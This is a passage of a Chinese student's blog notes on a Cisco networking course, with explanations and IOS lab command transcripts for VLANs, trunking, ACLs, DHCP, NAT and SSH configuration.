上，与学生和访客数据流量完全独立。</li></ul><ul><li><strong>成本降低</strong> － 成本高昂的网络升级需求减少，现有带宽和上行链路的利用率更高，因此可节约成本。</li></ul><ul><li><strong>性能提高</strong> － 将第 2 层平面网络划分为多个逻辑工作组（广播域）可以减少网络上不必要的流量并提高性能。</li></ul><ul><li><strong>减小广播域大小</strong> - 将网络划分为多个 VLAN 可减少广播域中的设备数量。如图所示，该网络中有六台计算机，但有三个广播域：Faculty、Student 和 Guest。</li></ul><ul><li><strong>提高 IT 员工效率</strong> － VLAN 为管理网络带来了方便，因为有相似网络需求的用户将共享同一个 VLAN。当您为特定 VLAN 设置新的交换机时，之前为该 VLAN 配置的所有策略和程序均会在分配新端口后应用到端口上。另外，通过为 VLAN 设置一个适当的名称，IT 员工很容易就知道该 VLAN 的功能。在图中，为了便于识别，我们将 VLAN 10 命名为“Faculty”，将 VLAN 20 命名为“Student”，将 VLAN 30 命名为“Guest”。</li></ul><ul><li><strong>简化项目管理和应用管理</strong> - VLAN 将用户和网络设备聚合到一起，以支持商业需求或地域上的需求。通过划分职能，可以让管理项目或使用专业应用更加轻松；此类应用程序的一个例子是教师的电子学习开发平台。</li></ul></blockquote><p>有vlan，广播帧只从已配置，属于同一vlan的端口转发出去。</p><h2 id="5-19"><a href="#5-19" class="headerlink" title="5/19"></a>5/19</h2><h3 id="vlan的类型"><a href="#vlan的类型" class="headerlink" title="vlan的类型"></a>vlan的类型</h3><p>在图中，运行默认配置的交换机上发出 <strong>show vlan brief</strong> 命令。默认情况下，所有端口都分配给 VLAN 1。</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519105755366.png" srcset="/img/loading.gif" class="" title="image-20200519105755366"><p>所有端口当前已分配给默认 VLAN 1。没有明确指定本征 VLAN，其他 VLAN 都不处于活动状态；因此网络的本征 VLAN 与管理 VLAN 相同。这将导致安全风险</p><h3 id="6-1-2-1-Vlan中继"><a href="#6-1-2-1-Vlan中继" class="headerlink" title="6.1.2.1 Vlan中继"></a>6.1.2.1 Vlan中继</h3><p>VLAN TRUNK 允许在交换机之间传播所有 VLAN 流量，这样位于同一 VLAN 但连接到不同交换机的设备便可以通信，不需要路由器的干预。VLAN TRUNK 不属于具体的 VLAN，而是作为多个 VLAN 中交换机与路由器之间的管道。</p><h3 id="6-1-2-3-标记以太网帧以便识别VLAN"><a href="#6-1-2-3-标记以太网帧以便识别VLAN" class="headerlink" title="6.1.2.3 标记以太网帧以便识别VLAN"></a>6.1.2.3 标记以太网帧以便识别VLAN</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519110222765.png" srcset="/img/loading.gif" class="" title="image-20200519110222765"><h3 id="6-2-1-2-创建vlan"><a href="#6-2-1-2-创建vlan" class="headerlink" title="6.2.1.2 创建vlan"></a>6.2.1.2 创建vlan</h3><pre><code>configure terminalvlan vlan-idname vlan-nameendshow vlan briefshow vlan</code></pre><h2 id="5-21"><a href="#5-21" class="headerlink" title="5/21"></a>5/21</h2><h3 id="6-2-1-3-端口分配到vlan"><a href="#6-2-1-3-端口分配到vlan" class="headerlink" title="6.2.1.3 端口分配到vlan"></a>6.2.1.3 端口分配到vlan</h3><pre><code>configure terminalinterface interface_idswitchport mode accessswitchport access vlan vlan_idend</code></pre><p><strong>注</strong>：使用 <strong>interface range</strong> 命令可同时配置多个接口。</p><h3 id="6-2-1-4-删除vlan分配"><a href="#6-2-1-4-删除vlan分配" class="headerlink" title="6.2.1.4 删除vlan分配"></a>6.2.1.4 删除vlan分配</h3><pre><code>configure terminalinterface f0/18no switchport access vlanend</code></pre><h3 id="6-2-1-5-删除"><a href="#6-2-1-5-删除" class="headerlink" title="6.2.1.5 删除"></a>6.2.1.5 删除</h3><p>no vlan vlan_id 删除vlan</p><h2 id="6-2-1-7"><a href="#6-2-1-7" class="headerlink" title="6.2.1.7"></a>6.2.1.7</h2><pre><code>S1(config)#vlan 10S1(config-vlan)#name Faculty/StaffS1(config-vlan)#exitS1(config)#vlan 20S1(config-vlan)#name StudentsS1(config-vlan)#exS1(config)#vlan 30S1(config-vlan)#name Guest(Default)S1(config-vlan)#exS1(config)#vlan 99S1(config-vlan)#name Management&amp;NativeS1(config-vlan)#exint g0/1 switchport mode trunkint g0/2switchport mode trunkS2(config)#vlan 10 S2(config-vlan)#name Faculty/StaffS2(config-vlan)#vlan 20S2(config-vlan)#name StudentsS2(config-vlan)#vlan 30S2(config-vlan)#name Guest(Default)S2(config-vlan)#vlan 99S2(config-vlan)#name Management&amp;NativeS2(config-vlan)#int f0/11S2(config-if)#switchport mode access S2(config-if)#switchport access vlan 10S2(config-if)#int f0/18S2(config-if)#switchport mode access S2(config-if)#switchport access vlan 20S2(config-if)#int f0/6S2(config-if)#switchport mode access S2(config-if)#switchport access vlan 30S2(config)#int g0/1S2(config-if)#sw mod trS2(config-if)#sw mod trunk S3(config)#vlan 10S3(config-vlan)#name Faculty/StaffS3(config-vlan)#S3(config-vlan)#vlan 20S3(config-vlan)#name StudentsS3(config-vlan)#vlan 30S3(config-vlan)#name Guest(Default)S3(config-vlan)#vlan 99S3(config-vlan)#name Management&amp;NativeS3(config-vlan)#exS3(config)#int f0/11S3(config-if)#sw mod acS3(config-if)#sw mod access S3(config-if)#sw acc vlan 10S3(config-if)#int f0/18S3(config-if)#sw mod access S3(config-if)#sw acc vlan 20S3(config-if)#int f0/6S3(config-if)#sw mod access S3(config-if)#sw acc vlan 30S3(config-if)#int g0/2S3(config-if)#sw mode tr</code></pre><p>##5/25</p><h3 id="6-2-2-2-原生vlan"><a href="#6-2-2-2-原生vlan" class="headerlink" title="6.2.2.2 原生vlan"></a>6.2.2.2 原生vlan</h3><pre><code>switchport mode trunkswitchport trunk native vlan vlan_id # 指定vlan给没标记的帧 原生vlanswitchport trunk allowed vlan vlan-list # 指定可以通过的vlan清单no switchport trunk allowed vlan #设为允许所有no switchport trunk native vlan #将原生vlan重置为默认</code></pre><h3 id="6-3-3-3-单臂路由器"><a href="#6-3-3-3-单臂路由器" class="headerlink" title="6.3.3.3 单臂路由器"></a>6.3.3.3 单臂路由器</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200525222920883.png" srcset="/img/loading.gif" class="" title="image-20200525222920883"><pre><code>interface g0/0.10encapsulation dotlq 10ip addinterface g0/0.30encapsulation dotlq 30int g0/0no shutdown</code></pre><h2 id="6-2-2-4"><a href="#6-2-2-4" class="headerlink" title="6.2.2.4"></a>6.2.2.4</h2><pre><code>S2S3先按表分配S1int g0/1sw mo trsw tr native vlan 99int g0/2sw mo trsw tr native vlan 99S2int g0/1sw mo trsw tr native vlan 99S3int g0/2sw mo trsw tr native vlan 99</code></pre><h2 id="6-2-3-7"><a href="#6-2-3-7" class="headerlink" title="6.2.3.7"></a>6.2.3.7</h2><p>S3有bug，pc5接在f0/17上</p><pre><code>S2(config)#int f0/11S2(config-if)#no sw ac vlan 30S2(config-if)#sw ac vlan 10S2(config-if)#int g0/1S2(config-if)#sw mo tS2(config-if)#sw mo trunk S3(config)#int f0/6S3(config-if)#no sw ac vlan 20S3(config-if)#sw ac vla 30S3(config)#int f0/17S3(config-if)#sw ac vla 20PC6的ip改成172.17.30.26</code></pre><h2 id="6-2-3-8"><a href="#6-2-3-8" class="headerlink" title="6.2.3.8"></a>6.2.3.8</h2><p>排错，先放过</p><h2 id="6-3-3-6"><a href="#6-3-3-6" class="headerlink" title="6.3.3.6"></a>6.3.3.6</h2><pre><code>S1(config)#vlan 10S1(config-vlan)#exS1(config)#vlan 30S1(config-vlan)#int f0/11S1(config-if)#sw m acS1(config-if)#sw ac vlan 10S1(config-if)#int f0/6S1(config-if)#sw m acS1(config-if)#sw ac vlan 30S1(config-if)#int g0/1S1(config-if)#sw m trunk R1(config-if)#int g0/0.10R1(config-subif)#encapsulation dot1Q 10R1(config-subif)#ip add 172.17.10.1 255.255.255.0R1(config-subif)#int g0/0.30R1(config-subif)#encapsulation dot1Q 30R1(config-subif)#ip add 172.17.30.1 255.255.255.0R1(config-subif)#int g0/0R1(config-if)#no shut</code></pre><h2 id="6-3-3-8"><a href="#6-3-3-8" class="headerlink" title="6.3.3.8"></a>6.3.3.8</h2><pre><code>R1(config)#int g0/0R1(config-if)#ip ad  172.17.25.2 255.255.255.252R1(config-if)#int g0/1.10R1(config-subif)#encapsulation dot1Q 10R1(config-subif)#ip add 172.17.10.1 255.255.255.0R1(config-subif)#int g0/1.20R1(config-subif)#encapsulation dot1Q 20R1(config-subif)#ip add 172.17.20.1 255.255.255.0R1(config-subif)#int g0/1.30R1(config-subif)#encapsulation dot1Q 30R1(config-subif)#ip add 172.17.30.1 255.255.255.0R1(config-subif)#int g0/1.88R1(config-subif)#encapsulation dot1Q 88R1(config-subif)#ip add 172.17.88.1 255.255.255.0R1(config-subif)#int g0/1.99R1(config-subif)#encapsulation dot1Q 99R1(config-subif)#ip add 172.17.99.1 255.255.255.0R1(config-subif)#int g0/1R1(config-if)#no shutS1(config-if-range)#vlan 10S1(config-vlan)#name Faculty/StaffS1(config-vlan)#vlan 20S1(config-vlan)#name StudentsS1(config-vlan)#vlan 30S1(config-vlan)#name Guest(Default)S1(config-vlan)#vlan 88S1(config-vlan)#name NativeS1(config-vlan)#vlan 99S1(config-vlan)#name ManagemenS1(config)#ip default-gateway 172.17.99.1S1(config)#int vlan99S1(config-if)#ip add 172.17.99.10 255.255.255.0S1(config-if)#no shutS1(config)#int g0/1 S1(config-if)#sw t native vlan 88</code></pre><h2 id="6-4-1-2"><a href="#6-4-1-2" class="headerlink" title="6.4.1.2"></a>6.4.1.2</h2><pre><code>R1(config)#int s0/0/0(config-if)#ip ad 172.31.1.2 255.255.255.0R1(config-if)#int g0/0.10R1(config-subif)#encapsulation  dot1Q 10R1(config-subif)#ip add 172.31.10.1 255.255.255.0R1(config-subif)#int g0/0.20R1(config-subif)#ip add 172.31.20.1 255.255.255.0R1(config-subif)#int g0/0.20R1(config-subif)#encapsulation dR1(config-subif)#encapsulation dot1Q 20R1(config-subif)#ip add 172.31.20.1 255.255.255.0R1(config-subif)#int g0/0.30R1(config-subif)#encapsulation dot1Q 30R1(config-subif)#ip add 172.31.30.1 255.255.255.0R1(config-subif)#int g0/0.88R1(config-subif)#encapsulation dot1Q 88R1(config-subif)#ip add 172.31.88.1 255.255.255.0R1(config-subif)#int g0/0.99R1(config-subif)#encapsulation dot1Q 99 native  ## native!!!!!!!R1(config-subif)#ip add 172.31.99.1 255.255.255.0S1(config)#vlan 10S1(config-vlan)#name SalesS1(config-vlan)#vlan 20S1(config-vlan)#name ProductionS1(config-vlan)#vlan 30S1(config-vlan)#name MarketingS1(config-vlan)#vlan 88S1(config-vlan)#name ManagementS1(config-vlan)#vlan 99S1(config-vlan)#name NativeS1(config-vlan)#exS1(config)#int vlan 88S1(config-if)#ip add 172.31.88.33 255.255.255.0S1(config-if)#exS1(config)#ip default-gateway 172.31.88.1int g0/1S1(config-if)#sw m trunk S1(config-if)#sw trunk native vlan 99HQ(config)#ip route 172.31.10.0 255.255.255.0 Serial0/0/0HQ(config)#ip route 172.31.20.0 255.255.255.0 Serial0/0/0HQ(config)#ip route 172.31.30.0 255.255.255.0 Serial0/0/0HQ(config)#ip route 172.31.88.0 255.255.255.0 Serial0/0/0HQ(config)#ip route 209.165.200.0 255.255.255.224 Serial0/1/0HQ(config)#ip route 209.165.200.0 255.255.255.224 Serial0/1/1 10</code></pre><h2 id="7-4-1-2"><a href="#7-4-1-2" class="headerlink" title="7.4.1.2 ??????"></a>7.4.1.2 ??????</h2><p>1.1.11100000.00000000</p><p>172.16.224</p><p>192~254</p><pre><code>hostname Branch!interface GigabitEthernet0/0ip address 172.16.159.254 255.255.240.0ip access-group HQServer inno shut!interface GigabitEthernet0/1ip address 172.16.143.254 255.255.240.0no shut!interface Serial0/0/0ip address 192.168.0.2 255.255.255.252no shut!router ripversion 2passive-interface GigabitEthernet0/0passive-interface GigabitEthernet0/1network 172.16.0.0network 192.168.0.0no auto-summary!ip access-list standard HQServerdeny 172.16.128.0 0.0.31.255permit anyhostname HQ!interface GigabitEthernet0/0ip address 172.16.127.254 255.255.192.0ip access-group BranchServer inno shut!interface GigabitEthernet0/1ip address 172.16.63.254 255.255.192.0no shut!interface Serial0/0/0ip address 192.168.0.1 255.255.255.252no shut!interface Serial0/0/1ip address 64.104.34.2 255.255.255.252no shut!router ripversion 2passive-interface GigabitEthernet0/0passive-interface GigabitEthernet0/1passive-interface Serial0/0/1network 172.16.0.0network 192.168.0.0default-information originateno auto-summary!ip route 0.0.0.0 0.0.0.0 Serial0/0/1!ip access-list standard BranchServerdeny 172.16.64.0 0.0.63.255permit any</code></pre><h2 id="5-27"><a href="#5-27" class="headerlink" title="5/27"></a>5/27</h2><h3 id="7-1-1-3-ACL"><a href="#7-1-1-3-ACL" class="headerlink" title="7.1.1.3 ACL"></a>7.1.1.3 ACL</h3><ul><li><strong>入站 ACL</strong> - 传入数据包经过处理之后才会被路由到出站接口。因为如果数据包被丢弃，就<strong>节省了执行路由查找</strong>的开销，所以入站 ACL 非常高效。如果 ACL 允许该数据包，则会处理该数据包以进行路由。当与入站接口连接的网络是需要检测的数据包的唯一来源时，最适合使用入站 ACL 来过滤数据包。(一进多出)</li><li><strong>出站 ACL</strong> - 传入数据包路由到出站接口后，由出站 ACL 进行处理。<strong>在来自多个入站接口的数据包通过同一出站接口之前，对数据包应用相同过滤器时，最适合使用出站 ACL。</strong>（多进一出）</li></ul><h3 id="7-1-2-5"><a href="#7-1-2-5" class="headerlink" title="7.1.2.5"></a>7.1.2.5</h3><pre><code>access-list 1 permit any!ORaccess-list 1 permit 0.0.0.0 255.255.255.255access-list 1 permit 192.168.10.10 0.0.0.0!ORaccess-list 1 permit host 192.168.10.10</code></pre><p><strong>应用 ACL 的规则</strong></p><p>一些使用 ACL 的指导原则：</p><ul><li><p>在位于内部网络和外部网络（例如互联网）交界处的防火墙路由器上使用 ACL。</p></li><li><p>在位于网络两个部分交界处的路由器上使用 ACL，以控制进出内部网络特定部分的流量。</p></li><li><p>在边界路由器（即位于网络边界的路由器）上配置 ACL。这样可以在内外部网络之间，或网络中受控度较低的区域与敏感区域之间起到基本的缓冲作用。</p></li><li><p>为边界路由器接口上配置的每种网络协议配置 ACL。</p></li></ul><p>为每种协议 (per protocol)、每个方向 (per direction)、每个接口 (per interface) 配置一个 ACL：</p><ul><li><p><strong>每种协议一个 ACL</strong> - 要控制接口上的流量，必须为接口上启用的每种协议定义相应的 ACL。</p></li><li><p><strong>每个方向一个 ACL</strong> - 一个 ACL 只能控制接口上一个方向的流量。要控制入站流量和出站流量，必须分别定义两个 ACL。</p></li><li><p><strong>每个接口一个 ACL</strong> - 一个 ACL 只能控制一个接口（例如 GigabitEthernet 0/0）上的流量。</p></li></ul><h3 id="7-1-4-1-拓展acl和标准的使用情况"><a href="#7-1-4-1-拓展acl和标准的使用情况" class="headerlink" title="7.1.4.1 拓展acl和标准的使用情况??"></a>7.1.4.1 拓展acl和标准的使用情况??</h3><p><strong>扩展 ACL</strong> - 将扩展 ACL 放置在尽可能靠近需要过滤的流量源的位置上。这样，不需要的流量会在靠近源网络的位置遭到拒绝，而无需通过网络基础设施。</p><p><strong>标准 ACL</strong> - 由于标准 ACL 不会指定目标地址，所以其位置应该尽可能靠近目标。在<strong>流量源附近设置标准 ACL</strong> 可以有效阻止流量通过应用了 ACL 的接口到达任何其他网络。</p><p>标准 ACL 命令的完整语法如下：</p><p>Router(config)# <strong>access-list</strong> <em>access-list-number</em> { <strong>deny</strong> | <strong>permit</strong> | <strong>remark</strong> } <em>source</em> [ <em>source-wildcard</em> ] [ <strong>log</strong> ]</p><p>[ <em>source-wildcard</em> ] （可选）要应用到源得32位通配符掩码。在要忽略得位上置1。</p><h3 id="7-2-1-2"><a href="#7-2-1-2" class="headerlink" title="7.2.1.2"></a>7.2.1.2</h3><p>配置标准 IPv4 ACL 之后，可以在接口配置模式下使用 <strong>ip access-group</strong> 命令将其关联到接口：</p><p>Router(config-if)# <strong>ip access-group</strong> { <em>access-list-number</em> | <em>access-list-name</em> } { <strong>in</strong> | <strong>out</strong> }</p><p>in/out 入站 出站过滤器</p><h3 id="7-2-1-3"><a href="#7-2-1-3" class="headerlink" title="7.2.1.3"></a>7.2.1.3</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527092034631.png" srcset="/img/loading.gif" class="" title="image-20200527092034631"><p>拒绝位于 192.168.10.10 的主机 PC1。但允许 192.168.10.0/24 网络中的其他各台主机。</p><h3 id="7-2-2-3"><a href="#7-2-2-3" class="headerlink" title="7.2.2.3"></a>7.2.2.3</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527101158208.png" srcset="/img/loading.gif" class="" title="image-20200527101158208"><p>show ip interface 端口</p><h3 id="7-2-3-1"><a href="#7-2-3-1" class="headerlink" title="7.2.3.1"></a>7.2.3.1</h3><p>线路配置模式中配置的 <strong>access-class</strong> 命令可限制特定 VTY（接入思科设备）与访问列表中地址之间的传入和传出连接。</p><p><strong>access-class</strong> 命令的语法是：</p><p>Router(config-line)# <strong>access-class</strong> <em>access-list-number</em> { <strong>in</strong> [ <strong>vrf-also</strong> ] | <strong>out</strong> }</p><p>参数 <strong>in</strong> 限制访问列表中的地址和思科设备之间的传入连接，而参数 <strong>out</strong> 则限制特定思科设备与访问列表中地址之间的传出连接。</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527102513372.png" srcset="/img/loading.gif" class="" title="image-20200527102513372"><h3 id="7-3-1-2"><a href="#7-3-1-2" class="headerlink" title="7.3.1.2"></a>7.3.1.2</h3><p>思科 IOS 将应用内部逻辑。如前所述，ACE 是按照顺序处理的；因此，ACE 的输入顺序非常重要。</p><h3 id="8-1-2-1-dhcp"><a href="#8-1-2-1-dhcp" class="headerlink" title="8.1.2.1 dhcp"></a>8.1.2.1 dhcp</h3><p>要排除特定地址，请使用 <strong>ip dhcp excluded-address</strong> 命令。</p><p><strong>ip dhcp pool</strong> <em>池名称</em> 命令创建具有特定名称的地址池，并使路由器进入 DHCPv4 配置模式</p><p>必须配置地址池和默认网关路由器。使用 <strong>network</strong> 语句定义可用地址范围。</p><p>使用 <strong>default-router</strong> 命令定义默认网关路由器。通常，网关是最接近客户端设备的路由器的 LAN 接口。虽然只需要一个网关，但是如果有多个网关，您最多可以列出八个地址。</p><p>其他 DHCPv4 池命令为可选命令。例如，使用 <strong>dns-server</strong> 命令配置 DHCPv4 客户端可用的 DNS 服务器 IPv4 地址。<strong>domain-name</strong> <em>domain</em> 命令用于定义域名。使用 <strong>lease</strong> 命令可以更改 DHCPv4 租期。默认租用值为一天。<strong>netbios-name-server</strong> 命令用于定义 NetBIOS WINS 服务器。</p><p>要禁用此服务，请使用 <strong>no service dhcp</strong> 全局配置模式命令。使用 <strong>service dhcp</strong> 全局配置模式命令可重新启用 DHCPv4 服务器进程。如果没有配置参数，启用服务将不会有效果。</p><h3 id="8-1-2-3-dhcp中继"><a href="#8-1-2-3-dhcp中继" class="headerlink" title="8.1.2.3 dhcp中继"></a>8.1.2.3 dhcp中继</h3><p>如果将 R1 配置为 DHCPv4 中继代理，它会将请求转发至位于子网 192.168.11.0 的 DHCPv4 服务器。</p><pre><code>R3(config)# interface g0/0R3(config-if)# ip helper-address 192.168.11.6</code></pre><h2 id="7-2-1-6"><a href="#7-2-1-6" class="headerlink" title="7.2.1.6"></a>7.2.1.6</h2><pre><code>R2(config)#access-list 1 deny 192.168.11.0 0.0.0.255R2(config)#access-list 1 permit anyR3(config)#access-list 1 deny 192.168.10.0 0.0.0.255R3(config)#access-list 1 permit anyR3(config-if)#int g0/0R3(config-if)#ip access-group 1 out</code></pre><h2 id="7-2-1-7"><a href="#7-2-1-7" class="headerlink" title="7.2.1.7"></a>7.2.1.7</h2><pre><code>R1(config)#ip access-list standard File_Server_RestrictionsR1(config-std-nacl)#permit host 192.168.20.4R1(config-std-nacl)#deny anyR1(config-if)#int f0/1R1(config-if)#ip access-group File_Server_Restrictions out</code></pre><h2 id="7-2-3-3"><a href="#7-2-3-3" class="headerlink" title="7.2.3.3"></a>7.2.3.3</h2><pre><code>Router(config)#access-list 99 permit host 10.0.0.1Router(config)#line vty 0 15Router(config-line)#access-class 99 i</code></pre><h2 id="8-1-3-3"><a href="#8-1-3-3" class="headerlink" title="8.1.3.3"></a>8.1.3.3</h2><pre><code>R2(config)#ip dhcp excluded-address 192.168.10.1 192.168.10.10R2(config)#ip dhcp excluded-address 19IP2.168.30.1 192.168.30.10R2(config)#ip dhcp pool R1-LANR2(dhcp-config)#network 192.168.10.0 255.255.255.0R2(dhcp-config)#default-router 10.1.1.2R2(dhcp-config)#no default-router 10.1.1.2R2(dhcp-config)#default-router 192.168.10.1R2(dhcp-config)#dns-server 192.168.20.254R2(config)#ip dhcp pool R3-LANR2(dhcp-config)#netwR2(dhcp-config)#network 192.168.30.0 255.255.255.0R2(dhcp-config)#dnsR2(dhcp-config)#dns-server 192.168.20.254R2(dhcp-config)#defR2(dhcp-config)#default-router 192.168.30.1R1(config)#int g0/0R1(config-if)#ip dhR1(config-if)#ip heR1(config-if)#ip helpR1(config-if)#ip helper-address 10.1.1.2R3(config)#int g0/0R3(config-if)#ip helpR3(config-if)#ip helper-address 10.2.2.2//Step 1: Configure the Gigabit Ethernet 0/1 interface on R2 to receive IP addressing from DHCP and activate the interface.R2(config)# interface g0/1R2(config-if)# ip address dhcpR2(config-if)# no shutdown</code></pre><h2 id="8-3-1-2"><a href="#8-3-1-2" class="headerlink" title="8.3.1.2"></a>8.3.1.2</h2><pre><code>S2(config)#vlan 10S2(config-vlan)#name SalesS2(config-vlan)#vlan 20S2(config-vlan)#name ProductionS2(config-vlan)#vlan 30S2(config-vlan)#name MarketingS2(config-vlan)#vlan 40S2(config-vlan)#name HRS2(config-vlan)#exS2(config)#int rangS2(config)#int range f0/5-9S2(config-if-range)#sw m acS2(config-if-range)#sw ac vlan 10S2(config-if-range)#int range f0/10-14S2(config-if-range)#sw m acS2(config-if-range)#sw ac vlan 20S2(config-if-range)#int range f0/15-19S2(config-if-range)#sw m acS2(config-if-range)#sw ac vlan 30S2(config-if-range)#int range f0/20-24S2(config-if-range)#sw m acS2(config-if-range)#sw ac vlan 40S2(config)#int f0/1S2(config-if)#sw m trunk S2(config-if)#int f0/2S2(config-if)#sw m trunk S2(config-if)#int f0/3S2(config-if)#sw m trunkS2(config-if)#int f0/4S2(config-if)#sw m trunkR1(config)#int g0/0.10R1(config-subif)#encapsulation dot1Q 10R1(config-subif)#ip add 172.31.10.1 255.255.255.224R1(config-subif)#int g0/0.20R1(config-subif)#encapsulation dot1Q 20R1(config-subif)#ip add 172.31.20.1 255.255.255.240R1(config-subif)#int g0/0.30R1(config-subif)#encapsulation dot1Q 30R1(config-subif)#ip add 172.31.30.1 255.255.255.128R1(config-subif)#int g0/0.40R1(config-subif)#encapsulation dot1Q 40R1(config-subif)#ip add 172.31.40.1 255.255.255.192R1(config)#ip dhcp pool VLAN_10R1(dhcp-config)#dns-server 209.165.201.14R1(dhcp-config)#default-router 172.31.10.1 R1(dhcp-config)#network 172.31.10.0 255.255.255.224R1(config)#ip dhcp pool VLAN_20R1(dhcp-config)#dns-server 209.165.201.14R1(dhcp-config)#network 172.31.20.0 255.255.255.240R1(dhcp-config)#default-router 172.31.20.1R1(config)#ip dhcp pool VLAN_30R1(dhcp-config)#network 172.31.30.1 255.255.255.128R1(dhcp-config)#dns-server 209.165.201.14R1(dhcp-config)#default-router 172.31.30.1R1(config)#ip dhcp excluded-address 172.31.10.1 172.31.10.10R1(config)#ip dhcp excluded-address 172.31.20.1 172.31.20.10R1(config)#ip dhcp excluded-address 172.31.30.1 172.31.30.10R1(config)#ip dhcp excluded-address 172.31.40.1 172.31.40.10</code></pre><h2 id="第九章"><a href="#第九章" class="headerlink" title="第九章"></a>第九章</h2><h3 id="9-1-2-1-静态nat"><a href="#9-1-2-1-静态nat" class="headerlink" title="9.1.2.1 静态nat"></a>9.1.2.1 静态nat</h3><p>NAT 转换有三种类型：</p><ul><li><p><strong>静态地址转换（静态 NAT）</strong>- 本地地址和全局地址之间的一对一地址映射。</p></li><li><p><strong>动态地址转换（动态 NAT）</strong>- 本地地址和全局地址之间的多对多地址映射。转换在可用的基础上进行：例如，如果有 100 个内部本地地址和 10 个内部全局地址，则任何时候都只能转换 100 个内部本地地址中的 10 个地址。动态 NAT 的这种限制使得它在用于生产网络时没有端口地址转换那么实用。</p></li><li><p><strong>端口地址转换 (PAT)</strong> - 本地地址和全局地址之间的多对一地址映射。此方法也称为过载（NAT 过载）。例如，如果有 100 个内部本地地址以及 10 个内部全局地址，PAT 使用端口作为附加参数来提供乘数效应，从而支持重复使用 10 个内部全局地址中的任何一个地址，重复次数高达 65,536 次（这取决于通信流是基于 UDP、TCP 还是 ICMP）。</p><p>  <strong>show ip nat translations</strong>。</p></li></ul><h3 id="9-2-1-4"><a href="#9-2-1-4" class="headerlink" title="9.2.1.4"></a>9.2.1.4</h3><p>Ip nat inside static <em>Inside_local_IP_address</em> <em>Inside_global_IP_address</em></p><p>Ip nat inside static <em>Outside_global_IP_address</em> <em>Outside_local_IP_address</em></p><pre><code>R1(config)#ip nat inside source static 172.16.16.1 64.100.50.1R1(config)#ip nat outside source static 64.100.50.1 209.165.128.130(config)#int g0/0R1(config-if)#ip nat inside R1(config-if)#int s0/0/0R1(config-if)#ip nat outside </code></pre><h3 id="9-2-2-2-配置动态nat"><a href="#9-2-2-2-配置动态nat" class="headerlink" title="9.2.2.2 配置动态nat"></a>9.2.2.2 配置动态nat</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527220001298.png" srcset="/img/loading.gif" class="" title="image-20200527220001298"><h3 id="9-2-2-5"><a href="#9-2-2-5" class="headerlink" title="9.2.2.5"></a>9.2.2.5</h3><pre><code>R2(config)#access-list 1 permit 172.16.0.0 0.0.255.255R2(config)#ip nat pool DYNAMIC 209.165.76.196 209.165.76.199 netmask 255.255.255.// Associate ACL1 with the NAT pool.R2(config)#ip nat inside source list 1 pool DYNAMICR2(config)# interface s0/0/0R2(config-if)# ip nat outsideR2(config-if)# interface s0/0/1R2(config-if)# ip nat inside</code></pre><h3 id="9-2-3-1-配置PAT：地址池"><a href="#9-2-3-1-配置PAT：地址池" class="headerlink" title="9.2.3.1 配置PAT：地址池"></a>9.2.3.1 配置PAT：地址池</h3><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200527231311081.png" srcset="/img/loading.gif" class="" title="image-20200527231311081"><p><strong>overload</strong> 关键字会启用 PAT。</p><h3 id="9-2-3-6"><a href="#9-2-3-6" class="headerlink" title="9.2.3.6"></a>9.2.3.6</h3><pre><code>R2(config)# ip access-list standard R2NATR2(config-std-nacl)# permit 192.168.10.0 0.0.0.255R2(config-std-nacl)# permit 192.168.20.0 0.0.0.255R2(config-std-nacl)# permit 192.168.30.0 0.0.0.255//使用名为 R2POOL 的 NAT 池配置 R2，该 NAT 池使用 209.165.202.128/30 地址空间中的第一个地址。R2(config)# ip nat pool R2POOL 209.165.202.129 209.165.202.129 netmask 255.255.255.//将命名 ACL 与 NAT 池相关联，并启用 PAT。R2(config)# ip nat inside source list R2NAT pool R2POOL overload//使用相应的内部和外部 NAT 命令配置 R2 接口。R2(config)# inte fa0/0R2(config-if)# ip nat insideR2(config-if)# inte s0/0/0R2(config-if)# ip nat insideR2(config-if)# inte s0/0/1R2(config-if)# ip nat insideR2(config-if)# inte s0/1/0R2(config-if)# ip nat outside//请参考拓扑结构。 创建静态 NAT 转换，以将 local.pka 内部地址映射至其外部地址R2(config)# ip nat inside source static 192.168.20.254 209.165.202.130</code></pre><h3 id="9-3-1-4"><a href="#9-3-1-4" class="headerlink" title="9.3.1.4"></a>9.3.1.4</h3><pre><code>//Correct the Interfaces.//Assign the ip nat inside and ip nat outside commands to the correct ports.R2(config)# interface Serial0/0/0R2(config-if)# ip nat outsideR2(config-if)# interface Serial0/0/1R2(config-if)# ip nat inside//Correct the Access-list.//Delete access-list 101 and replace it with a similar list that is also one statement in length. The only difference should be the wildcard.R2(config)# no access-list 101R2(config)# access-list 101 permit ip 10.4.10.0 0.0.1.255 any</code></pre><h3 id="9-4-1-2"><a href="#9-4-1-2" class="headerlink" title="9.4.1.2"></a>9.4.1.2</h3><pre><code>Switch(config)#host HQ-SWHQ-SW(config)#ip domain-name cisco.comHQ-SW(config)#crypto key generate rsaHow many bits in the modulus [512]: 1024HQ-SW(config)#username HQadmin password ciscoclassHQ-SW(config)#ip ssh version 2HQ-SW(config)#ip ssh authentication-retries 2HQ-SW(config)#ip ssh time-out HQ-SW(config)#line vty 0 15HQ-SW(config-line)#login localHQ-SW(config-line)#transport input sshHQ-SW(config)#service password-encryption </code></pre><h2 id="考题记录"><a href="#考题记录" class="headerlink" title="考题记录"></a>考题记录</h2><blockquote><p>ospf管理距离为110</p></blockquote><img 